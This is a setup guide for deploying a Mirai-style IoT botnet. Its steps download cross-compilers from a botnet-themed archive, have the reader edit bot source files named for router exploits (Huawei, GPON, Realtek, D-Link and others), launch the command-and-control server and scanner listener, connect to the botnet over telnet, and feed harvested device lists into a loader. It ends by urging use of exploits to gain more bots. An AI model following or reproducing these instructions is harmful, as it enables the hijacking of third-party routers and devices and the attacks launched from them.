# miễn trừ mọi trách nhiệm, Dự án chỉ mang tính chất tham khảo

# Setup Guide by VanTrong

## Install on CentOS 7.x
### Basic VPS Configuration
**Recommended Specs:**
- 2 vCores
- 4GB RAM
- 20GB SSD

### Step 1: Update & Install Required Packages
```bash
yum update -y
yum install epel-release -y
yum groupinstall "Development Tools" -y
yum install gmp-devel -y
ln -s /usr/lib64/libgmp.so.3  /usr/lib64/libgmp.so.10
yum install screen wget bzip2 gcc nano gcc-c++ electric-fence sudo git libc6-dev httpd xinetd tftpd tftp-server mysql mysql-server gcc glibc-static -y
```

### Step 2: Install Golang
```bash
wget https://go.dev/dl/go1.21.3.linux-amd64.tar.gz
rm -rf /usr/local/go && tar -C /usr/local -xzf go1.21.3.linux-amd64.tar.gz
export PATH=$PATH:/usr/local/go/bin
go version
go env -w GO111MODULE=off
go get -u github.com/go-sql-driver/mysql
```

### Step 3: Download & Extract Cross Compilers
```bash
mkdir /etc/xcompile
cd /etc/xcompile
wget https://mirailovers.io/HELL-ARCHIVE/COMPILERS/cross-compiler-i586.tar.bz2
wget https://mirailovers.io/HELL-ARCHIVE/COMPILERS/cross-compiler-i686.tar.bz2
wget https://mirailovers.io/HELL-ARCHIVE/COMPILERS/cross-compiler-m68k.tar.bz2
wget https://mirailovers.io/HELL-ARCHIVE/COMPILERS/cross-compiler-mips.tar.bz2
wget https://mirailovers.io/HELL-ARCHIVE/COMPILERS/cross-compiler-mipsel.tar.bz2
wget https://mirailovers.io/HELL-ARCHIVE/COMPILERS/cross-compiler-powerpc.tar.bz2
wget https://mirailovers.io/HELL-ARCHIVE/COMPILERS/cross-compiler-sh4.tar.bz2
wget https://mirailovers.io/HELL-ARCHIVE/COMPILERS/cross-compiler-sparc.tar.bz2
wget https://mirailovers.io/HELL-ARCHIVE/COMPILERS/cross-compiler-armv4l.tar.bz2
wget https://mirailovers.io/HELL-ARCHIVE/COMPILERS/cross-compiler-armv5l.tar.bz2
wget https://mirailovers.io/HELL-ARCHIVE/COMPILERS/cross-compiler-armv6l.tar.bz2
wget https://mirailovers.io/HELL-ARCHIVE/COMPILERS/cross-compiler-armv7l.tar.bz2
wget https://mirailovers.io/HELL-ARCHIVE/COMPILERS/arc_gnu_2017.09_prebuilt_uclibc_le_arc700_linux_install.tar.gz
wget https://mirailovers.io/HELL-ARCHIVE/COMPILERS/cross-compiler-powerpc-440fp.tar.bz2
wget https://mirailovers.io/HELL-ARCHIVE/COMPILERS/cross-compiler-x86_64.tar.bz2
wget https://mirailovers.io/HELL-ARCHIVE/COMPILERS/cross-compiler-i486.tar.gz

tar -jxf cross-compiler-i586.tar.bz2
tar -jxf cross-compiler-m68k.tar.bz2
tar -jxf cross-compiler-mips.tar.bz2
tar -jxf cross-compiler-mipsel.tar.bz2
tar -jxf cross-compiler-powerpc.tar.bz2
tar -jxf cross-compiler-sh4.tar.bz2
tar -jxf cross-compiler-sparc.tar.bz2
tar -jxf cross-compiler-armv4l.tar.bz2
tar -jxf cross-compiler-armv5l.tar.bz2
tar -jxf cross-compiler-armv6l.tar.bz2
tar -jxf cross-compiler-armv7l.tar.bz2
tar -vxf arc_gnu_2017.09_prebuilt_uclibc_le_arc700_linux_install.tar.gz
tar -jxf cross-compiler-powerpc-440fp.tar.bz2
tar -jxf cross-compiler-x86_64.tar.bz2
tar -xvf cross-compiler-i486.tar.gz

rm -rf *.tar.bz2 *.tar.gz *.tar *.tar.xz

mv cross-compiler-i586 i586
mv cross-compiler-i686 i686
mv cross-compiler-m68k m68k
mv cross-compiler-mips mips
mv cross-compiler-mipsel mipsel
mv cross-compiler-powerpc powerpc
mv cross-compiler-sh4 sh4
mv cross-compiler-sparc sparc
mv cross-compiler-armv4l armv4l
mv cross-compiler-armv5l armv5l
mv cross-compiler-armv6l armv6l
mv cross-compiler-armv7l armv7l
mv arc_gnu_2017.09_prebuilt_uclibc_le_arc700_linux_install arc
mv cross-compiler-powerpc-440fp powerpc-440fp
mv cross-compiler-x86_64 x86_64
```

### Step 4: Change IPs in Source Code
Modify the following files with your IP:
```bash
/bot/includes.h
/bot/huawei.c
/bot/asus.c
/bot/comtrend.c
/bot/dlink_scanner.c
/bot/gpon443.c
/bot/jaws.c
/bot/linksys.c
/bot/gpon80_scanner.c
/bot/netlink.c
/bot/tr064.c
/bot/realtek.c
/bot/thinkphp.c
/bot/hnap_scanner.c
/cnc/main.go
/loader/src/main.c
/loader/src/headers/config.h
/scanListen.go
/dlr/main.c
```

### Step 5: Install & Configure MySQL
```bash
yum install mariadb-server -y
systemctl start mariadb.service
mysql_secure_installation
mysql -pYOURPASSWORD
```
Run the following MySQL queries:
```sql
CREATE DATABASE cosmic;
USE cosmic;
-- (Create tables as needed)
```

### Step 6: Restart Services
```bash
iptables -F
service httpd restart
service mariadb.service restart
```

### Step 7: Increase File Limits
```bash
nano /usr/include/bits/typesizes.h
# Change 1024 to 999999, save and exit

ulimit -n999999; ulimit -u999999; ulimit -e999999
```

### Step 8: Build & Run
```bash
cd ~/
chmod 0777 * -R
sh build.sh
ulimit -n999999; ulimit -u999999; ulimit -e999999
```

### Step 9: Start Services
```bash
cd ~/
screen ./cnc
CTRL+A then D
cd loader
screen ./scanListen
CTRL+A then D
```

### How to Connect to Botnet Server
```bash
telnet <your_server_ip> 1312
```

### How to Load Bots
```bash
cd loader
cat *.txt | ./loader
```

**NOTE:** Use exploits to gain more bots. Instructions are in the files.

🔥 **Setup Complete!** 🚀

